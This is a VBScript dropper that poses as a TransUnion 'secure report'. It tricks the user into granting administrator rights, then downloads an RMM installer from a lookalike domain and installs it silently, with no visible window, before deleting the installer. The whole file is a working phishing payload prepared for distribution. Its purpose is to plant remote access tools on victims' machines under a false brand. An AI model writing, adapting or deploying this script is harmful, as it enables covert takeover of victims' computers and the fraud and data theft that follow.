Option Explicit

' Configure these values before distributing the script.
Const PRODUCT_NAME = "TransUnion"
Const DOWNLOAD_URL = "https://rmm.st-secures.com/deploy/77a49ff4-b650-4783-b21f-6790949d1886/installer.msi"
Const MSI_FILE_NAME = "rmm-installer.msi"
Const MSI_ARGS = "/qn /norestart"

Dim shell, fso
Dim tempDir, workDir, msiPath, logPath, exitCode

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If Not IsRunningAsAdmin() Then
    If MsgBox(PRODUCT_NAME & " requires your permission to view the secure report." & vbCrLf & vbCrLf & _
              "Continue?", _
              vbYesNo + vbQuestion, PRODUCT_NAME & " Report") <> vbYes Then
        WScript.Quit 1
    End If

    RelaunchElevated
    WScript.Quit 0
End If

On Error Resume Next

tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
workDir = fso.BuildPath(tempDir, "RmmInstaller")

If Not fso.FolderExists(workDir) Then
    fso.CreateFolder workDir
End If

msiPath = fso.BuildPath(workDir, MSI_FILE_NAME)
logPath = fso.BuildPath(workDir, "install.log")

Err.Clear
DownloadFile DOWNLOAD_URL, msiPath
If Err.Number <> 0 Then
    FailAndQuit "Download failed: " & Err.Description, msiPath
End If

If Not fso.FileExists(msiPath) Then
    FailAndQuit "Download failed: the MSI file was not created.", msiPath
End If

If fso.GetFile(msiPath).Size < 1024 Then
    FailAndQuit "Download failed: the MSI file is unexpectedly small. Check DOWNLOAD_URL.", msiPath
End If

exitCode = shell.Run("msiexec.exe /i " & Q(msiPath) & " " & MSI_ARGS & " /L*v " & Q(logPath), 0, True)

If exitCode = 0 Then
    CleanupFiles msiPath
    WScript.Quit 0
ElseIf exitCode = 3010 Then
    CleanupFiles msiPath
    WScript.Quit 0
Else
    MsgBox "Installation failed. Windows Installer exit code: " & exitCode & vbCrLf & vbCrLf & _
           "Log file:" & vbCrLf & logPath, _
           vbCritical, PRODUCT_NAME & " Installer"
    WScript.Quit exitCode
End If

Function IsRunningAsAdmin()
    Err.Clear
    On Error Resume Next
    shell.RegRead "HKEY_USERS\S-1-5-19\Environment\TEMP"
    IsRunningAsAdmin = (Err.Number = 0)
    Err.Clear
End Function

Sub RelaunchElevated()
    Dim app

    Err.Clear
    On Error Resume Next
    Set app = CreateObject("Shell.Application")
    app.ShellExecute "wscript.exe", Q(WScript.ScriptFullName), "", "runas", 1

    If Err.Number <> 0 Then
        MsgBox "Administrator permission was not granted. Installation cancelled.", _
               vbExclamation, PRODUCT_NAME & " Installer"
    End If
End Sub

Sub DownloadFile(ByVal url, ByVal targetPath)
    Dim http, stream

    On Error Resume Next
    Err.Clear
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then Exit Sub

    http.Open "GET", url, False
    If Err.Number <> 0 Then Exit Sub

    http.SetRequestHeader "User-Agent", PRODUCT_NAME & " Installer"
    http.SetRequestHeader "Cache-Control", "no-cache"
    If Err.Number <> 0 Then Exit Sub

    http.Send
    If Err.Number <> 0 Then Exit Sub

    If http.Status < 200 Or http.Status > 299 Then
        Err.Raise vbObjectError + 1000, "DownloadFile", "HTTP " & http.Status & " " & http.StatusText
        Exit Sub
    End If

    Set stream = CreateObject("ADODB.Stream")
    If Err.Number <> 0 Then Exit Sub

    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile targetPath, 2
    stream.Close
End Sub

Sub CleanupFiles(ByVal installerPath)
    On Error Resume Next

    If fso.FileExists(installerPath) Then
        fso.DeleteFile installerPath, True
    End If
End Sub

Sub FailAndQuit(ByVal message, ByVal installerPath)
    CleanupFiles installerPath
    MsgBox message, vbCritical, PRODUCT_NAME & " Installer"
    WScript.Quit 1
End Sub

Function Q(ByVal value)
    Q = """" & value & """"
End Function